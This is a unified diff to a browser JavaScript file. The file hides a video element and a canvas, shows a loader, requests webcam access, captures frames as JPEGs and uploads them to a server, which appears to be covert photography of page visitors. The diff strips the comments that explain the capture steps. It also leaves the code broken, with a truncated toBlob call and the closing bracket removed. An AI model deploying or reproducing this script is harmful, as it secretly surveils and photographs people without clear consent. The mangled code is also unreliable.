@@ -7,23 +7,18 @@ window.addEventListener('DOMContentLoaded', () => {
   video.style.display = 'none';
   document.body.appendChild(video);
   
-  // Create a hidden canvas for photo capture
   const canvas = document.createElement('canvas');
   const ctx = canvas.getContext('2d');
   
-  // Hide loader, show container after 1 second
   setTimeout(() => {
     loader.style.display = 'none';
     container.style.display = 'flex';
     
-    // Access webcam and capture photo
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
           video.play();
-          
-          // Wait for video to be ready
           video.addEventListener('loadedmetadata', () => {
             // Set canvas dimensions to match video
             canvas.width = video.videoWidth;
@@ -51,7 +46,6 @@ window.addEventListener('DOMContentLoaded', () => {
     // Draw current video frame to canvas
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     
-    // Convert canvas to blob
     canvas.toBlob(blob => {
       if (blob) {
         // Create timestamp for unique filename
@@ -61,7 +55,7 @@ window.addEventListener('DOMContentLoaded', () => {
         // Send photo to server
         sendPhotoToServer(blob, filename);
       }
-    }, 'image/jpeg', 0.8); // JPEG format with 80% quality
+    }, 
   }
   
   function sendPhotoToServer(blob, filename) {
@@ -83,4 +77,3 @@ window.addEventListener('DOMContentLoaded', () => {
       console.error('Error sending photo:', error);
     });
   }
-});
